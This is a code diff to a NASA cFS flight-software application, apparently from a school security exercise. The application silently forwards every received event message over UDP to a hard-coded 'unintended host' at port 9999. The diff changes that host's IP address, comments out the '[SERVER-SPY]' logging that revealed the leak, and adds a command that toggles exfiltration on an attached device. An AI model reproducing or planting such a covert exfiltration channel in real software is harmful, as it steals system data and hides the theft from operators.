@@ -14,7 +14,7 @@
 #include "cfe_msgids.h"
 
 //#define UNINTENDED_HOST "192.168.0.130" 
-#define UNINTENDED_HOST "192.168.56.1" //School
+#define UNINTENDED_HOST "10.88.227.54" //School
 #define UNINTENDED_PORT 9999  // Port number
 
 
@@ -162,6 +162,15 @@ int32 SERVER_AppInit(void)
         return status;
     }
 
+    status = CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CLIENT_TOGGLE_EXFIL_MID), SERVER_AppData.CmdPipe);
+    if (status != CFE_SUCCESS)
+    {
+        CFE_EVS_SendEvent(SERVER_SUB_TOGGLE_EXFIL_ERR_EID, CFE_EVS_EventType_ERROR,
+            "SERVER: Error subscribing to Client Toggle Exfiltration, MID=0x%04X, RC=0x%08X",
+            CLIENT_TOGGLE_EXFIL_MID, (unsigned int)status);
+        return status;
+    }
+
     CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CFE_ES_APP_TLM_MID), SERVER_AppData.CmdPipe);
     CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CFE_ES_HK_TLM_MID), SERVER_AppData.CmdPipe);
     CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CFE_EVS_LONG_EVENT_MSG_MID), SERVER_AppData.CmdPipe);
@@ -263,24 +272,29 @@ void SERVER_ProcessCommandPacket(void)
             size_t msgSize = 0;
             CFE_MSG_GetSize(SERVER_AppData.MsgPtr, &msgSize); // Retrieves the total size of the received message and stores it in msgSize
 
-            OS_printf("[SERVER-SPY] EVS MID 0x%04X received, size = %zu\n", CFE_SB_MsgIdToValue(MsgId), msgSize); // Prints a log with the recieved msgid and its size
+            // OS_printf("[SERVER-SPY] EVS MID 0x%04X received, size = %zu\n", CFE_SB_MsgIdToValue(MsgId), msgSize); // Prints a log with the recieved msgid and its size
 
-            // Dump first 64 bytes
-            uint8_t *raw = (uint8_t *)SERVER_AppData.MsgPtr; // Casts the incoming message pointer to a byte array inspection
-            size_t limit = (msgSize > 64) ? 64 : msgSize; // Sets a limit of 64 bytes for data dumping to avoid overflow
+            // // Dump first 64 bytes
+            // uint8_t *raw = (uint8_t *)SERVER_AppData.MsgPtr; // Casts the incoming message pointer to a byte array inspection
+            // size_t limit = (msgSize > 64) ? 64 : msgSize; // Sets a limit of 64 bytes for data dumping to avoid overflow
 
-            OS_printf("[SERVER-SPY] Raw message bytes: ");
+            // OS_printf("[SERVER-SPY] Raw message bytes: ");
 
-            for (size_t i = 0; i < limit; ++i) // Iterates through the message bytes and prints them in hex format
-            {
-                OS_printf("%02X ", raw[i]);
-            }
-            OS_printf("\n");
+            // for (size_t i = 0; i < limit; ++i) // Iterates through the message bytes and prints them in hex format
+            // {
+            //     OS_printf("%02X ", raw[i]);
+            // }
+            // OS_printf("\n");
 
             SERVER_ForwardToListener(SERVER_AppData.MsgPtr, msgSize); // Sends the entire raw message over UDP to a remote listener
 
             break;
         }
+
+        case CLIENT_TOGGLE_EXFIL_MID:
+            SERVER_HandleToggleExfil();
+            break;
+
 
 
         /*
@@ -292,18 +306,18 @@ void SERVER_ProcessCommandPacket(void)
            size_t msgSize = 0;
            CFE_MSG_GetSize(SERVER_AppData.MsgPtr, &msgSize);
        
-           OS_printf("[SERVER] Unhandled MID: 0x%04X, size: %zu\n", CFE_SB_MsgIdToValue(MsgId), msgSize);
+        //    OS_printf("[SERVER] Unhandled MID: 0x%04X, size: %zu\n", CFE_SB_MsgIdToValue(MsgId), msgSize);
        
-           // Print raw bytes (first 32 bytes max to avoid flooding)
-           uint8_t *raw = (uint8_t *)SERVER_AppData.MsgPtr;
-           size_t limit = (msgSize > 32) ? 32 : msgSize;
+        //    // Print raw bytes (first 32 bytes max to avoid flooding)
+        //    uint8_t *raw = (uint8_t *)SERVER_AppData.MsgPtr;
+        //    size_t limit = (msgSize > 32) ? 32 : msgSize;
        
-           OS_printf("[SERVER] Raw bytes: ");
-           for (size_t i = 0; i < limit; ++i)
-           {
-               OS_printf("%02X ", raw[i]);
-           }
-           OS_printf("\n");
+        //    OS_printf("[SERVER] Raw bytes: ");
+        //    for (size_t i = 0; i < limit; ++i)
+        //    {
+        //        OS_printf("%02X ", raw[i]);
+        //    }
+        //    OS_printf("\n");
        
            SERVER_AppData.HkTelemetryPkt.CommandErrorCount++;
            CFE_EVS_SendEvent(SERVER_PROCESS_CMD_ERR_EID, CFE_EVS_EventType_ERROR,
@@ -765,4 +779,25 @@ void SERVER_ForwardToListener(const void *data, size_t length)
 
     sendto(sockfd, data, length, 0, (struct sockaddr *)&serverAddr, sizeof(serverAddr)); // Sends the raw data buffer over UDP to the specified IP and port.
     close(sockfd); // Closes the socket after sending the message.
+}
+
+void SERVER_HandleToggleExfil(void)
+{
+    uint8_t toggle = ((SERVER_ToggleExfil_cmd_t*)SERVER_AppData.MsgPtr)->EnableExfil;
+
+    CFE_EVS_SendEvent(SERVER_CMD_EXFIL_EID, CFE_EVS_EventType_INFORMATION,
+                      "SERVER: Received toggle exfil command from client: %u", toggle);
+
+    // Send it to the hardware device (uint8 version)
+    int32 status = SERVER_CommandDevice(&SERVER_AppData.ServerUart, SERVER_TOGGLE_EXFIL_CMD, ((uint32_t)toggle << 24));
+    if (status == OS_SUCCESS)
+    {
+        SERVER_AppData.HkTelemetryPkt.DeviceCount++;
+    }
+    else
+    {
+        SERVER_AppData.HkTelemetryPkt.DeviceErrorCount++;
+        CFE_EVS_SendEvent(SERVER_REQ_DATA_ERR_EID, CFE_EVS_EventType_ERROR,
+                          "SERVER: Failed to send ToggleExfil to device, status = %d", status);
+    }
 }
